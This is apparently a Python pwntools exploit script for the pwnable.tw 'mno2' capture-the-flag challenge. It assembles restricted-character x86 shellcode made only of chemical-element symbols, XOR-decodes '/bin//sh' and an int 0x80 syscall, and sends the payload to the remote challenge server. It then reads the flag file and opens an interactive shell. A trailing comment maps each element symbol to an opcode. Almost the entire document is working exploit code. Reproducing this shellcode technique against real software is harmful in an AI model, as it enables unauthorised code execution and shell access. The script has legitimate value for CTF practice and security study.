from pwn import *
#p=process("./mno2")
p=remote("chall.pwnable.tw",10301)
"""
gdb.attach(p,'''
b *0x80487E8
c
next 210
''')
"""
s='''
push   ebp
pop    eax
gs inc esi
dec eax
dec eax
dec eax
dec eax
xor esi,DWORD PTR [eax]
xor edi,DWORD PTR [eax]
dec esi
'''
#set esi-->//sh
s+='dec    eax\n'*0x3c
s+='''
push esp
push 0x50734f4f
dec    eax
dec    eax
dec    eax
dec    eax
xor esi,DWORD PTR [eax]

inc edx
push 0x59423030
dec    eax
dec    eax
dec    eax
dec    eax
xor esi,DWORD PTR [eax]

inc edx
push 0x61425050
dec    eax
dec    eax
dec    eax
dec    eax
xor esi,DWORD PTR [eax]

'''
#set edi-->/bin
s+='''
inc edx
push 0x69424934
dec    eax
dec    eax
dec    eax
dec    eax
xor edi,DWORD PTR [eax]

inc edx
push 0x57694259
dec    eax
dec    eax
dec    eax
dec    eax
xor edi,DWORD PTR [eax]

inc edx
push 0x50426942
dec    eax
dec    eax
dec    eax
dec    eax
xor edi,DWORD PTR [eax]
'''


#set the stack 
s+='''
push ebx
push esi
push edi

push esp
gs inc esi;dec esi
'''
s+='inc ebx\n'*0xb
s+='push ebx\n'
s+='dec ebx\n'*0xb
s+='''
push ebx/*0*/
push ebx/*0*/
'''
s+='dec eax\n'*(0xc)
s+='''
push eax
push edi
'''
s+='dec eax\n'*0x18
s+='''
xor edi,DWORD PTR [eax]
push esi
dec eax
dec eax
dec eax
dec eax
xor esi,DWORD PTR [eax]
'''
# esi=edi=0
# now what we need is /cd/80
s+='''
inc edx
push 0x324f7242
dec eax
dec eax
dec eax
dec eax
xor edi,DWORD PTR [eax]

inc edx
push 0x324f724b
dec eax
dec eax
dec eax
dec eax
xor esi,DWORD PTR [eax]

inc edi
gs inc esi
dec esi
inc esi
inc esi
xor dh,BYTE PTR [esi]
xor BYTE PTR [edi],dh


dec esi
dec edi

xor dh,BYTE PTR [esi]
xor BYTE PTR [edi],dh

inc edx
popa
	
'''
#cd80 over

#context.log_level='debug'
s=asm(s)
s=s.ljust(0x324f7242-0x324F6E4D,'F')
s+="SK"+"B"*8+"UC"
print len(s)
p.sendline(s.ljust(0x324f744d-0x324F6E4D,'H')+'CoO2')
sleep(2)
p.sendline("cat /home/mno2/flag")
p.interactive("nier>")
#A:`PsOO`,B:`YB00`,C:`aBPP`
'''
[H]      dec eax			0x47
[He]	 would not be used
[B]      inc edx			0x42
[Ba]     inc edx;popa			0x4261
[Bhxxxx] inc edx;push 0xdeadbeef
[Phxxxx] push esp;push 0xdeadbeef
[C]      inc ebx			0x43
[F]      inc esi			0x46
[Fe]	 would not be used
[I]      dec ecx			0x48
[K]      dec ebx			0x4a
[N]      dec esi			0x4e
[Ne]	 would not be used
[O]      dec edi			0x4f
[P]      push eax			0x50			
[S]      push ebx			0x53
[U]      push ebp			0x55
[V]      push esi			0x56
[W]      push edi			0x57
[Y]      pop ecx			0x59
[XeFN]   pop eax;gs inc esi;dec esi
[TeFN]   push esp;gs inc esi;dec esi
[ReFN]   push edx;gs inc esi;dec esi
[GeFN]   inc edi;gs inc esi;dec esi
[PdFN]	 push eax;inc esi;dec esi
[Rfx]	 push edx;inc ?x;
[30]     xor esi,DWORD PTR [eax]
[38]     xor edi,DWORD PTR [eax]
[32]     xor esi,DWORD PTR [edx]
[26]     xor dh,BYTE PTR [esi]
[07]     xor BYTE PTR [edi],dh
['H', 'He', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'P', 'S', 'K', 'V', 'Fe', 'Ge', 'Se', 'Y', 'Rh', 'Pd', 'Cd', 'Te', 'I', 'Xe', 'Ce', 'Nd', 'Gd', 'W', 'Re', 'Th', 'U', 'Md', 'Bh']
'''


